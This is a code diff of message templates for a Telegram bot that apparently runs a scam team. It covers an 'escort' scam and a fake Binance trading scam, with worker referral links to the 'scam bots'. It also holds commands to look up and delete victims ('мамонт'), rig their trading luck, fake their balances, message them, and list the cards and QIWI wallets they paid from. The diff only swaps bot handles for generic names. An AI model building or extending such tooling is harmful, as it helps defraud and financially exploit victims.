@@ -40,9 +40,9 @@ referral_system_text = emojize(
 escort_text = emojize(
     "💝 <b>Эскорт</b> SCAM\n\n"
     "Твой код - {worker_id}\n"
-    "Скам бот - @prettyescortbot\n"
-    "Тех. поддержка - @escort18support\n\n"
-    "Твоя рефка - https://t.me/prettyescortbot?start={worker_id}\n"
+    "Скам бот - @escortbot\n"
+    "Тех. поддержка - @support\n\n"
+    "Твоя рефка - https://t.me/escortbot?start={worker_id}\n"
     "Мануалы - https://t.me/blessinform\n\n"
     "/info <code>[ID мамонта]</code> - инфо о мамонте\n"
     "/del <code>[ID мамонта]</code> - удалить мамонта\n"
@@ -54,9 +54,9 @@ escort_text = emojize(
 trading_text = emojize(
     "📈 <b>Трейдинг</b> SCAM\n\n"
     "Твой код - {worker_id}\n"
-    "Скам бот - @tradebinancerubot\n"
-    "Тех. поддержка - @TradeBinanceHelp\n\n"
-    "Твоя рефка Binance - https://t.me/tradebinancerubot?start={worker_id}\n\n"
+    "Скам бот - @tradebot\n"
+    "Тех. поддержка - @support\n\n"
+    "Твоя рефка Binance - https://t.me/tradebot?start={worker_id}\n\n"
     "Карты с которых вы пополняли:\n"
     "{pay_cards}\n"
     "QIWI с которых вы пополняли:\n"
@@ -67,6 +67,6 @@ trading_text = emojize(
     "/fart <code>[ID мамонта]</code> - вкл / выкл / выкл/вкл фарт мамонту\n"
     "/msg <code>[ID мамонта]</code>; <code>[Сообщение]</code> - сообщение от бота\n"
     "/bal <code>[ID мамонта];</code> <code>[Баланс]</code> - изменить баланс мамонта\n"
-    "Запрещено использовать любые ТП кроме @TradeBinanceHelp\n"
+    "Запрещено использовать любые ТП кроме @support\n"
     "Запрещено принимать оплату на любые реквизиты кроме наших"
 )
